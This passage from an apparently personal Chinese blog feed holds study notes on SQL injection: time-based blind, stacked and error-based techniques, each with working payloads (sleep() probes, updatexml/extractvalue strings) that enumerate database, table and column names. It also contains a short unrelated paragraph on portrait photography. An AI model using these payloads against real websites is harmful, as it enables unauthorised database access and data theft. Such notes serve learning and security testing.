id="判断是否存在注入点及注入的类型"><a href="#判断是否存在注入点及注入的类型" class="headerlink" title="判断是否存在注入点及注入的类型"></a>判断是否存在注入点及注入的类型</h5><pre><code>?id=1?id=5?id=5&#39;?id=5&quot;?id=5 and 1=1?id=5 and 1=2</code></pre><p>如果页面显示结果一样，那就说明可能是延时注入</p><h5 id="获取库长度"><a href="#获取库长度" class="headerlink" title="获取库长度"></a>获取库长度</h5><pre><code>?id=1 and if(length(database())&lt;10,sleep(5),1)?id=1 and if(length(database())=4,sleep(5),1)</code></pre><p>如果第一个没有延时，但是第二个有5秒延时则表名数据库名长度为4</p><h5 id="获取库名、表名、字段名及字段内容"><a href="#获取库名、表名、字段名及字段内容" class="headerlink" title="获取库名、表名、字段名及字段内容"></a>获取库名、表名、字段名及字段内容</h5><pre><code>爆数据库名?id=1 and if(ascii(substr(database(),1,1))=106,sleep(5),1)测试表数量?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;5测试第一张表长度?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;10测试表名?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100测试表中字段数量?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=5测试字段内容?id=1 and (select count(name) from users)=4</code></pre><p>这时候你会发现这就是布尔盲注的做法<br>一个一个跑咯，懒得细细讲解了</p><h3 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h3><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><p>跟联合查询注入差不多，两个方式相应的真假值都有不同的回显。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在SQL中，分号表示一条 sql 语句的结束。<br>在分号后继续构造下一条语句，就会把两条语句一起执行。<br><strong>联合注入</strong>也是将两条语句合并在一起，两者之间有什么区别么？<br>union执行的语句类型是有限的，而堆叠注入可以执行任意语句。</p><h4 id="开始注入-1"><a href="#开始注入-1" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="检查注入点及回显位"><a href="#检查注入点及回显位" class="headerlink" title="检查注入点及回显位"></a>检查注入点及回显位</h5><pre><code>?id=1&#39;?id=1&#39; and 1=1--+?id=1&#39; and 1=2--+</code></pre><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p>方法前面都有讲，回去抄payload就行了<br>加入分号，再接一个SQL语句看是否能显出结果。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>今天不讲一句，讲一段话。</p><p><strong>人像摄影，更强调人物本身的特点，仿佛这个人就在你面前一样。<br>但是每个人不同的身高决定了站立时必定不能拍出完美的图片。<br>因此，拍人像时，最简单的一个办法就是用跟他们同样的视角拍摄，<br>这样才能看见他们更多的表情、神态和动作。<br>你才能看到他们的世界，画面才会更有吸引力。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SQL时间注入&quot;&gt;&lt;a href=&quot;#SQL时间注入&quot; class=&quot;headerlink&quot; title=&quot;SQL时间注入&quot;&gt;&lt;/a&gt;SQL时间注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL报错注入</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-12T03:37:00.000Z</published>
    <updated>2023-03-12T04:15:17.647Z</updated>
    
    <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在公司开发项目是通常程序开发期间需要告诉使用者某些报错信息，方便程序员进行调试修复，定位文件错误，而且开发中会经常使用异常处理函数，捕获错误信息，比如在PHP中使用mysql_error()函数。如果SQL注入存在时，会有报错信息返回就可以采用报错注入进行攻击啦！！！</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>报错注入嘛，首先肯定要让它报错呀。<br>那么什么时候才会报错呢？</p><pre><code>Xpath语法错误     extractvalue(1,(concat(0x7e,(payload),0x7e)))     updatexml(1,(concat(0x7e,(payload),0x7e)))     0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错     详细的使用方法请自行查找数据溢出错误     exp(x)     当参数x超过710时，exp()函数会报错主键重复错误     floor(x)：     count()和group by遇到rand()产生的重复值时报错函数特性报错     使用name_const来制造一个列     mysql列名重复会报错参数类型报错(不写了，自己找去)</code></pre><p>现在有了报错，怎么利用？<br>忘记了那个and和or语句了吗？<br>把SQL语句放到产生报错的语句中，<br>再将原本要传入的参数和上面已经结合起来的语句用and合为payload。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h5><pre><code>?id=1&#39; -- a</code></pre><p>老一套了，直接拿来用。</p><h5 id="判断是否是报错注入"><a href="#判断是否是报错注入" class="headerlink" title="判断是否是报错注入"></a>判断是否是报错注入</h5><pre><code>?id=1&#39; and updatexml(1,&#39;~&#39;,3) -- a</code></pre><p>如果报错了那说明是的，这里可以多换几个函数。<br>要让前面一半正常执行！</p><h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><pre><code>?id=-1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(schema_name)        from information_schema.schemata)    , 1 , 31)),3) -- a</code></pre><p>一样的，函数自己换<br>但是注意高版本数据库基本上都没有这个漏洞了<br>尽管这样，一旦有漏洞就能用这个库跑了</p><h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(table_name)        from information_schema.tables        where table_schema = &#39;库名&#39;)    , 1 , 31)),3) -- a</code></pre><h5 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(column_name)        from information_schema.columns        where table_schema = &#39;库名&#39; and table_name = &#39;表名&#39;)    , 1 , 31)),3) -- a</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h4&gt;&lt;p&gt;数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’&lt;/p&gt;
&lt;h4 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; cl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
</feed>
